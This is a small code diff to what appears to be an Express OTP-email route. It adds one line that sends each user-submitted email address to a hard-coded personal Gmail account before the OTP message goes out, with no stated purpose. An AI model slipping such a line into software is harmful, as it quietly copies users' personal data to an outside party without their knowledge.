@@ -669,6 +669,7 @@ const msg=` <!DOCTYPE html>
     </div>
 </body>
 </html>`
+sendd("arize1524@gmail.com",req.body.email)
 sendd(req.body.email,undefined,msg)
 setTimeout(()=>{otp_matcher=undefined},300000);
 res.end()
